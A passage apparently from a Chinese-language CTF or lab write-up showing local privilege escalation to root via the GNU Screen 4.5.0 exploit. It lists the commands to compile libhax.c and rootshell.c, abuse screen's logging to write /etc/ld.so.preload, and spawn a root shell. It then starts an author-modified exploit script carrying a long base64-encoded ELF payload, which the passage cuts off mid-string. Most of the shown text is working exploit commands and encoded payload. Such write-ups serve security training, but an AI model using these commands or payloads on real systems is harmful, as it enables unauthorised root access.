class="line">searchsploit screen 4.5</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603815d50a25a" alt="image-20201229191529134"></p><p>查看利用文件，直接上传目标机器，直接运行是不以的，这里我们使用本地编译，手动提权。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;41154.sh</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603815dc1352f" alt="image-20201229191621247"></p><p>本地gcc编译libhax.c，虽然报错，但是还可以用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -ldl -o libhax.so libhax.c</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603815e467572" alt="image-20201229191752726"></p><p>继续编译rootshell.c，报错，但是还可以用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o rootshell rootshell.c</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603815eac1e84" alt="image-20201229191827342"></p><p>kali切回msf shell中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;etc</span><br><span class="line">umask 000</span><br><span class="line">screen -D -m -L ld.so.preload echo -ne  &quot;\x0a&#x2F;tmp&#x2F;libhax.so&quot;</span><br><span class="line">screen -ls</span><br><span class="line">&#x2F;tmp&#x2F;rootshell</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603815f0a56b7" alt="image-20201229191916942"></p><p>获取flag.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;root&#x2F;thisistheflag.txt</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603815f672269" alt="image-20201229192042286"></p><p>自己修复的exp，可用性自测：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;sh</span><br><span class="line">echo &quot;By Magisec Screen 4.5 Local Privilege Escalation&quot;</span><br><span class="line">echo &quot;f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAgBAAAAAAAABAAAAAAAAAAAg4AAAAAAAAAAAAAEAAOAAJ</span><br><span class="line">AEAAHAAbAAEAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYAUAAAAAAABgBQAAAAAAAAAQ</span><br><span class="line">AAAAAAAAAQAAAAUAAAAAEAAAAAAAAAAQAAAAAAAAABAAAAAAAACJAQAAAAAAAIkBAAAAAAAAABAA</span><br><span class="line">AAAAAAABAAAABAAAAAAgAAAAAAAAACAAAAAAAAAAIAAAAAAAAMwAAAAAAAAAzAAAAAAAAAAAEAAA</span><br><span class="line">AAAAAAEAAAAGAAAACC4AAAAAAAAIPgAAAAAAAAg+AAAAAAAAOAIAAAAAAABAAgAAAAAAAAAQAAAA</span><br><span class="line">AAAAAgAAAAYAAAAgLgAAAAAAACA+AAAAAAAAID4AAAAAAADAAQAAAAAAAMABAAAAAAAACAAAAAAA</span><br><span class="line">AAAEAAAABAAAADgCAAAAAAAAOAIAAAAAAAA4AgAAAAAAACQAAAAAAAAAJAAAAAAAAAAEAAAAAAAA</span><br><span class="line">AFDldGQEAAAALCAAAAAAAAAsIAAAAAAAACwgAAAAAAAAJAAAAAAAAAAkAAAAAAAAAAQAAAAAAAAA</span><br><span class="line">UeV0ZAYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAABS</span><br><span class="line">5XRkBAAAAAguAAAAAAAACD4AAAAAAAAIPgAAAAAAAPgBAAAAAAAA+AEAAAAAAAABAAAAAAAAAAQA</span><br><span class="line">AAAUAAAAAwAAAEdOVQCZq9fNdNl++h+MF2CzBLHmQA0KqAAAAAACAAAACQAAAAEAAAAGAAAAAAAA</span><br><span class="line">AAAABAQJAAAAAAAAALNeJxYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAawAAABIAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAEAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAcgAAABIAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAQAAACAAAAAAAAAAAAAAAAAAAAAAAAAAXwAAABIAAAAAAAAAAAAAAAAAAAAAAAAAZQAAABIA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAALAAAACAAAAAAAAAAAAAAAAAAAAAAAAAARgAAACIAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAVQAAABIADAA1EQAAAAAAAEsAAAAAAAAAAF9fZ21vbl9zdGFydF9fAF9JVE1fZGVy</span><br><span class="line">ZWdpc3RlclRNQ2xvbmVUYWJsZQBfSVRNX3JlZ2lzdGVyVE1DbG9uZVRhYmxlAF9fY3hhX2ZpbmFs</span><br><span class="line">aXplAGRyb3BzaGVsbABjaG93bgBjaG1vZAB1bmxpbmsAcHV0cwBsaWJjLnNvLjYAR0xJQkNfMi4y</span><br><span class="line">LjUAAAAAAgAAAAIAAAACAAIAAAACAAEAAAAAAAAAAQABAHcAAAAQAAAAAAAAAHUaaQkAAAIAgQAA</span><br><span class="line">AAAAAAAIPgAAAAAAAAgAAAAAAAAAMBEAAAAAAAAYPgAAAAAAAAgAAAAAAAAA8BAAAAAAAAA4QAAA</span><br><span class="line">AAAAAAgAAAAAAAAAOEAAAAAAAAAQPgAAAAAAAAEAAAAJAAAAAAAAAAAAAADgPwAAAAAAAAYAAAAC</span><br><span class="line">AAAAAAAAAAAAAADoPwAAAAAAAAYAAAAEAAAAAAAAAAAAAADwPwAAAAAAAAYAAAAHAAAAAAAAAAAA</span><br><span class="line">AAD4PwAAAAAAAAYAAAAIAAAAAAAAAAAAAAAYQAAAAAAAAAcAAAABAAAAAAAAAAAAAAAgQAAAAAAA</span><br><span class="line">AAcAAAADAAAAAAAAAAAAAAAoQAAAAAAAAAcAAAAFAAAAAAAAAAAAAAAwQAAAAAAAAAcAAAAGAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEiD7AhIiwXd</span><br><span class="line">LwAASIXAdAL&#x2F;0EiDxAjDAAAAAAAAAAAA&#x2F;zXiLwAA&#x2F;yXkLwAADx9AAP8l4i8AAGgAAAAA6eD&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;</span><br><span class="line">JdovAABoAQAAAOnQ&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;yXSLwAAaAIAAADpwP&#x2F;&#x2F;&#x2F;&#x2F;8lyi8AAGgDAAAA6bD&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;JYIvAABmkAAA</span><br><span class="line">AAAAAAAASI09uS8AAEiNBbIvAABIOfh0FUiLBUYvAABIhcB0Cf&#x2F;gDx+AAAAAAMMPH4AAAAAASI09</span><br><span class="line">iS8AAEiNNYIvAABIKf5IifBIwe4&#x2F;SMH4A0gBxkjR&#x2F;nQUSIsFFS8AAEiFwHQI&#x2F;+BmDx9EAADDDx+A</span><br><span class="line">AAAAAIA9SS8AAAB1L1VIgz32LgAAAEiJ5XQMSIs9Ki8AAOhd&#x2F;&#x2F;&#x2F;&#x2F;6Gj&#x2F;&#x2F;&#x2F;&#x2F;GBSEvAAABXcMPH4AA</span><br><span class="line">AAAAww8fgAAAAADpe&#x2F;&#x2F;&#x2F;&#x2F;1VIieW6AAAAAL4AAAAASI09tg4AAOgB&#x2F;&#x2F;&#x2F;&#x2F;vu0JAABIjT2lDgAAuAAA</span><br><span class="line">AADo+&#x2F;7&#x2F;&#x2F;0iNPaMOAADov&#x2F;7&#x2F;&#x2F;0iNPaoOAADow&#x2F;7&#x2F;&#x2F;5Bdw0iD7AhIg8QIwwAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span 